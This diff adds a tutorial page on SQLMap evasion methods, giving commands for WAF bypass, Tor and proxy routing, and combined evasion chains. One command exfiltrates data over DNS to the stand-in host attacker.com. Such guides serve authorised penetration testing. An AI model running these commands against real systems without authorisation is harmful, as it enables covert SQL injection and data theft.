@@ -1,0 +1,182 @@
+---
+title: Other Evasion Methods
+description: Learn about additional evasion techniques in SQLMap to bypass security controls
+---
+
+# Other Evasion Methods
+
+Beyond tamper scripts and WAF detection, SQLMap offers several additional methods to evade detection during security testing. These techniques can help bypass various security controls when used appropriately in authorized testing scenarios.
+
+## HTTP Parameter Manipulation
+
+### Parameter Pollution
+
+Using multiple instances of the same parameter:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php" --data="id=1&id=2" --param-del="&"
+```
+
+This technique can confuse some security filters that don't properly handle parameter pollution.
+
+### Parameter Reordering
+
+Changing the order of HTTP parameters:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php" --data="b=2&a=1&c=3" --param-del="&"
+```
+
+Some WAFs may only inspect the first few parameters or expect parameters in a specific order.
+
+## HTTP Header Manipulation
+
+### Custom Headers
+
+Adding custom HTTP headers:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" --headers="X-Forwarded-For: 127.0.0.1\nX-Custom-Header: Value"
+```
+
+This can bypass security controls that trust certain headers or don't inspect custom headers.
+
+### Host Header Manipulation
+
+Modifying the Host header:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" --host="internal-system.local"
+```
+
+This can bypass security controls that rely on the Host header for validation.
+
+## Request Method Switching
+
+### Method Switching
+
+Changing the HTTP method:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php" --data="id=1" --method=PUT
+```
+
+Some security controls may only inspect GET and POST requests but not other HTTP methods.
+
+### Method Obfuscation
+
+Using non-standard HTTP methods:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" --method=CUSTOM
+```
+
+This can sometimes bypass security controls that only check standard HTTP methods.
+
+## Traffic Routing and Proxying
+
+### Multiple Proxies
+
+Routing through multiple proxies:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" --proxy="http://proxy1:8080" --proxy-cred="user:pass" --proxy-file="proxies.txt"
+```
+
+The `--proxy-file` option allows you to specify a list of proxies to rotate through.
+
+### Tor Network
+
+Routing through the Tor network:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" --tor --tor-port=9050 --tor-type=SOCKS5 --check-tor
+```
+
+This routes all SQLMap traffic through the Tor network, making it harder to trace and potentially bypassing IP-based restrictions.
+
+## Timing and Rate Controls
+
+### Request Delays
+
+Adding random delays between requests:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" --delay=2 --time-sec=10
+```
+
+This adds a 2-second delay between requests and sets a 10-second time for time-based blind injections.
+
+### Throttling
+
+Limiting the number of concurrent threads:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" --threads=1
+```
+
+This can help avoid triggering rate-limiting mechanisms.
+
+## Payload Obfuscation
+
+### Inline Comments
+
+Using inline comments in SQL statements:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" --prefix="'/*" --suffix="*/--" --technique=B
+```
+
+This adds specific SQL comments before and after the injection payload.
+
+### Custom Prefix and Suffix
+
+Adding custom strings before and after the payload:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" --prefix=")" --suffix="AND(1=1"
+```
+
+This helps when the injection point is within a specific SQL context.
+
+## Advanced Techniques
+
+### Out-of-Band Exploitation
+
+Using out-of-band channels for data exfiltration:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" --dns-domain=attacker.com
+```
+
+This uses DNS requests for data exfiltration, which may bypass controls that only monitor HTTP traffic.
+
+### Second-Order Injection
+
+Testing for second-order SQL injection:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" --second-url="http://www.example.com/page.php?id=1" --second-req="second-request.txt"
+```
+
+This tests for vulnerabilities where the injection is stored and then executed in a different location.
+
+<Note title="Ethical and Legal Warning">
+These evasion techniques should only be used in authorized security testing scenarios. Unauthorized attempts to bypass security controls are illegal and unethical.
+</Note>
+
+## Combining Evasion Techniques
+
+For maximum effectiveness, combine multiple evasion techniques:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" --random-agent --tamper=between,charencode,randomcase --delay=2 --tor --proxy="http://proxy:8080" --level=5 --risk=3
+```
+
+This comprehensive approach combines:
+- Random user agent
+- Multiple tamper scripts
+- Request delays
+- Tor routing
+- Additional proxy
+- Maximum test level and risk
